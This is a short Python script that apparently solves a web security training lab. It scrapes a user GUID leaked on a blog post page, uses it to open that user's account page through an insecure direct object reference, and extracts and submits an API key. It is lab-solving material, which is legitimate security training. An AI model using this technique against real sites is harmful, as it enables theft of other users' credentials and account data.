import requests
import sys
import re

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 solution.py <url>")
        sys.exit(1)

burp_url = sys.argv[1]
take_uuid = burp_url + '/post?postId=6'
take_api_key = burp_url + '/my-account?id='

burp_headers = {}
response = requests.get(take_uuid, headers=burp_headers)

find_uuid = re.search(r'[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}',response.text)
uuid = find_uuid.group(0)

burp_headers = {}
response2 = requests.get(take_api_key+uuid, headers=burp_headers)
find_api_key = re.search(r'[A-Za-z0-9]{32}',response2.text)
api_key = find_api_key.group(0)


burp_headers = {}
burp_data = {"answer": api_key}
requests.post(burp_url+'/submitSolution', headers=burp_headers, data=burp_data)
